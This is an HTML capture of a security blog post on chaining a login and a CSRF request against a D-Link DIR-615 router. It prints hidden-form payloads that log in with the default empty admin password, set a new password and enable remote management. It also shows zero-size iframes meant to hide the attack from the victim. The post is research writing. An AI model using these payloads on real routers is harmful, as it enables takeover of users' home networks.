<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="https://charlieeriksen.github.io" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>Two-stage CSRF attacks | ceriksen.com</title>

<link rel="stylesheet" type="text/css" media="all" href="https://charlieeriksen.github.io/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->



<link rel='stylesheet' id='crayon-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/comment-reply.min.js?ver=3.8.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<link rel='next' title='Protected: Proxmox VE information disclosure' href='https://charlieeriksen.github.io/2012/10/01/proxmox-ve-information-disclosure/' />

<link rel='canonical' href='https://charlieeriksen.github.io/2012/09/29/two-stage-csrf-attacks/' />
<link rel='shortlink' href='https://charlieeriksen.github.io/?p=142' />
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="single single-post postid-142 single-format-standard  single-author singular">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="https://charlieeriksen.github.io/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="https://charlieeriksen.github.io/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="https://charlieeriksen.github.io/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<div id="primary">
			<div id="content" role="main">

			
				
				
<article id="post-142" class="post-142 post type-post status-publish format-standard hentry category-security tag-csrf">
	<header class="entry-header">
				<h2 class="entry-title">Two-stage CSRF attacks</h2>
		
		<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/09/29/two-stage-csrf-attacks/" title="6:48 pm" rel="bookmark" class="entry-date"><time datetime="2012-09-29T18:48:38+00:00" pubdate>September 29, 2012</time></a>		</div><!-- .entry-meta -->
	</header><!-- .entry-header -->

	<div class="entry-content">
				<p>This week I ran into an interesting problem. I was doing some poking around with my DLink DIR-615(EU) router while working on some firmware reverse engineering. It occurred very quickly to me that the router had no protection against CSRF attacks. As with many other routers, the router also doesn&#8217;t enforce you to set a password for the Admin account, which simply sets it up for getting owned.</p>
<p>As it turns out, the vulnerability I found was already well-documented, but I saw no exploit which targeted both the CSRF attack and the default weak credentials in a single exploit. This would be needed for even a semi-reliable exploit to be delivered over the internet. I wondered why, and started investigating what would we required.</p>
<p><strong>The target</strong></p>
<p>The DLink DIR-615(EU) runs on a default IP(192.168.0.1) with default credentials being the Admin account with no password. The authentication system is kind of funky, in that on a successful authentication no cookie is set. Rather, it simply authenticates your local IP. I&#8217;ve not dug into this much further, but the short version of this story is that you either have to hope that the user has authenticated against the router somewhat recently, or you need to authenticate as a part of the attack.</p>
<p>The two requests we need to make to log in and do something to abuse this CSRF, such as change the admin password and enable remote management, are as following:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877489260725954447" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="loginForm" method="POST" action="http://192.168.0.1/login.htm"&gt;
	&lt;input type="hidden" name="page" value="login" /&gt;
	&lt;input type="hidden" name="submitType" value="0" /&gt;
	&lt;input type="hidden" name="sel_userid" value="admin" /&gt;
	&lt;input type="hidden" name="userid" value="" /&gt;
	&lt;input type="hidden" name="passwd" value="" /&gt;
	&lt;input type="hidden" name="captchapwd" value="" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877489260725954447-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489260725954447-2">2</div><div class="crayon-num" data-line="crayon-53c9877489260725954447-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489260725954447-4">4</div><div class="crayon-num" data-line="crayon-53c9877489260725954447-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489260725954447-6">6</div><div class="crayon-num" data-line="crayon-53c9877489260725954447-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489260725954447-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877489260725954447-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"loginForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/login.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489260725954447-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"login"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489260725954447-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"submitType"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489260725954447-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"sel_userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489260725954447-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"userid"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489260725954447-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"passwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489260725954447-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"captchapwd"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489260725954447-8"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0043 seconds] -->
<p>&nbsp;</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877489278938701953" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="adminForm" method="POST" action="http://192.168.0.1/tools_admin.htm"&gt;
	&lt;input type="hidden" name="page" value="tools_admin" /&gt;
	&lt;input type="hidden" name="admin_password1" value="qweasd" /&gt;
	&lt;input type="hidden" name="admin_password2" value="qweasd" /&gt;
	&lt;input type="hidden" name="hostname" value="REMOTEENABLED" /&gt;
	&lt;input type="hidden" name="graphical_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_enable" value="1" /&gt;
	&lt;input type="hidden" name="remote_http_management_port" value="2121" /&gt;
	&lt;input type="hidden" name="remote_inbound_filter" value="11" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877489278938701953-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489278938701953-2">2</div><div class="crayon-num" data-line="crayon-53c9877489278938701953-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489278938701953-4">4</div><div class="crayon-num" data-line="crayon-53c9877489278938701953-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489278938701953-6">6</div><div class="crayon-num" data-line="crayon-53c9877489278938701953-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489278938701953-8">8</div><div class="crayon-num" data-line="crayon-53c9877489278938701953-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489278938701953-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877489278938701953-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"adminForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/tools_admin.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489278938701953-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"tools_admin"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489278938701953-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password1"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489278938701953-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"admin_password2"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489278938701953-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"hostname"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"REMOTEENABLED"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489278938701953-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"graphical_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489278938701953-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_enable"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"1"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489278938701953-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_http_management_port"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"2121"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489278938701953-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"remote_inbound_filter"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"11"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489278938701953-10"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0052 seconds] -->
<p><strong> The problem</strong></p>
<p>In order to get a reliable CSRF exploit for this, we&#8217;d really like a single page we can send an user to, and it takes care of making these requests to do the exploit. But this turned out to be not quite so easy, and googling turned up very few suggestion for how to make several requests in order and time them correctly to allow authentication before the CSRF attack request. Here were some of the ways I tried:</p>
<p><strong>Failed solution 1: A single page with 2 forms, calling document.formname.submit(); in sequence</strong></p>
<p>This didn&#8217;t work. What ended up happening is that the login form wasn&#8217;t submitted. Also because we submit the form, we end up with the problem that the browser navigates to action URL. This is because of the default target of the form(_self).</p>
<p><strong><strong>Failed solution </strong>2: A single page with 2 forms that has a target _blank or an iframe</strong></p>
<p>Given the navigation issue I encountered in my first attempt, I started testing out how the target of the form affected things. As it turns out, modern browsers are really not big fans of iframes or new windows. Targeting a frame simply didn&#8217;t work. And when you use _blank as a target, the user has to explicitly allow it in modern browsers. In order to exploit this reliably, we can&#8217;t rely on user interaction.</p>
<p><strong><strong>Failed solution </strong>3: XMLHttp requests</strong></p>
<p>AJAX is wonderful. So I figured why not try and come up with a solution using XMLHttp and a bit of Javascript. This fell flat very quickly, as XMLHttp respects same origin policy.</p>
<p><strong>The solution</strong></p>
<p>A solution to this would require following:</p>
<ul>
<li>Control of timing between requests</li>
<li>To still have control of the page the user loaded, even if the form navigates to a target.</li>
<li>No popups</li>
<li>Little, if any, indication to the user that their router is being owned</li>
</ul>
<p>My solution ended up being a bit less neat. However it works quite well against any default browser without any noscript and such(Which would break most CSRF attacks requiring to post, unless you want to rely on user input). It&#8217;s quite a bit along the line of the idea of setting each form target to a different frame. But since I couldn&#8217;t get them to target an iframe in a single page, I split the payload into 3 parts.</p>
<ol>
<li>Landing page with 2 iframes, each containing their own payload</li>
<li>A login request</li>
<li>A delayed CSRF attack against the vulnerable page as desired</li>
</ol>
<p>The main landing pages is quite simple, as it just loads each page for execution:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877489282000873878" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;iframe src="login.html" width="0" height="0"&gt;
&lt;/iframe&gt;
&lt;iframe src="exploit.html"  width="0" height="0"&gt;
&lt;/iframe&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877489282000873878-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489282000873878-2">2</div><div class="crayon-num" data-line="crayon-53c9877489282000873878-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877489282000873878-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877489282000873878-1"><span class="crayon-o">&lt;</span><span class="crayon-e">iframe </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"login.html"</span><span class="crayon-h"> </span><span class="crayon-v">width</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-v">height</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489282000873878-2"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">iframe</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877489282000873878-3"><span class="crayon-o">&lt;</span><span class="crayon-e">iframe </span><span class="crayon-v">src</span><span class="crayon-o">=</span><span class="crayon-s">"exploit.html"</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">width</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-h"> </span><span class="crayon-v">height</span><span class="crayon-o">=</span><span class="crayon-s">"0"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877489282000873878-4"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">iframe</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0016 seconds] -->
<p>By setting the width and height, all you&#8217;re left with is a tiny dot on the screen. This could be mitigated by doing some styling potentially to render it off screen.</p>
<p>Second step is to log in. Here we rely on the fact that the admin user by default does not have any password set.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

